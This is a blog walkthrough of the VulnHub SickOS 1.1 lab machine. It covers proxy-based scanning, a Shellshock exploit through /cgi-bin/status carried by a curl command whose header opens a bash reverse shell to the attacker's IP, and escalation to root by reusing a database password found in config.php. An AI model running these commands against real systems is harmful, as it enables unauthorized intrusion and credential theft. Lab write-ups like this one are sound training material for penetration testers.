---
title: "VulnHub - SickOS 1.1 Walkthrough"
date: 2020-09-28
tags: [vulnhub, walkthrough]
header:
  image: "/images/sickos11-thumbnail.jpg"
excerpt: "Walkthroughs"
---

# VulnHub- SickOS 1.1 Walkthrough

Hello, everyone. Today I will share the Boot to Root process in the SickOS 1.1 vulnerable machine. I will share only the successful way. There will not be a lot of information.

## Information Gathering

We are starting with a **Nmap scan** to find open ports and services.

```
root@kali:~# nmap -p- -T4 -A sickos1.local  
...
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)  
...
3128/tcp open http-proxy Squid http proxy 3.1.19  
| http-open-proxy: Potentially OPEN proxy.  
...  
8080/tcp closed http-proxy  
...
```

We see that there is a potential **Squid Proxy Server**. I will try to connect to the victim by port 80. It becomes unsuccessful. Then, I will connect to the Squid Proxy page from Firefox on the port 3128. We front with the page, but there is not a lot of stuff to do.

So I will try to connect to port 80 to our victim, but this time I will use proxy with **FoxyProxy extension** (sickos1.local:3128).

Bingo! We can see the main page of our victim, but there is not anything valuable.

I will know have a **Nikto** search.

```
root@kali:~/SickOS1# nikto -h sickos1.local -useproxy sickos1.local:3128  
...
+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec 5 04:35:02 2015  
...
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).  
...
```

There is the `robots.txt` file. Also, probably, our server is vulnerable ti **Shellshock Bash Bug**.

Firstly, we are looking for `robots.txt`.
```
User-agent: *  
Disallow: /  
Dissalow: /wolfcms
```

There is a `/wolfcms` directory.

We check it and it is a simple Wolf Content Management System.

The second main point that we found from the Nikto search is that the `/cgi-bin/status` directory and it is vulnerable to Shellshock.

More about [Shellshoclk vulnerability](https://www.youtube.com/watch?v=aKShnpOXqn0).


Then we do a search for secret directories and files.
```
root@kali:~/SickOS1# dirb http://sickos1.local -p sickos1.local:3128  
...
---- Scanning URL: http://192.168.12.147/ ----  
+ http://192.168.12.147/cgi-bin/ (CODE:403|SIZE:290)  
+ http://192.168.12.147/connect (CODE:200|SIZE:109)  
+ http://192.168.12.147/index (CODE:200|SIZE:21)  
+ http://192.168.12.147/index.php (CODE:200|SIZE:21)  
+ http://192.168.12.147/robots (CODE:200|SIZE:45)  
+ http://192.168.12.147/robots.txt (CODE:200|SIZE:45)  
+ http://192.168.12.147/server-status (CODE:403|SIZE:295)  
...
```

## Exploitation
Then we try to make a reverse shell connection using this vulnerability.

```
root@kali:~/SickOS1# curl -v -x http://192.168.12.147:3128 -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.12.131/1234 0>&1' http://192.168.12.147/cgi-bin/status  
* Trying 192.168.12.147:3128...
```
Read More About [Shellshock Bash Bug Exploitation](http://garage4hackers.com/showthread.php?t=6902).

Bingo! We have a connection now!

## Privilege Escalation
Then I will try to do more enumeration.

```
www-data@SickOs:/var/www/wolfcms$ cat config.php  
cat config.php  
<?php  

// Database information:  
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)  
// The path can only be absolute path or :memory:  
// For more info look at: www.php.net/pdo  

// Database settings:  
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');  
define('DB_USER', 'root');  
define('DB_PASS', 'john@123');  
define('TABLE_PREFIX', '');
```

We found the `john@123` password. I will try to log in `sickos` account with the same password. I will be successful.

```
sickos@SickOs:/var/www/wolfcms$ sudo -l  
...
User sickos may run the following commands on this host:  
(ALL : ALL) ALL  
sickos@SickOs:/var/www/wolfcms$ sudo su root  
root@SickOs:/var/www/wolfcms# cd /root   
root@SickOs:~# ls  
a0216ea4d51874464078c618298b1367.txt  
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!   
ROOT!
You have Successfully completed SickOS1.1.  
Thanks for Trying  
root@SickOs:~#
```
We have all the privileges, so I try to gain root access and taking a flag.!
Victory! Thanks for reading!
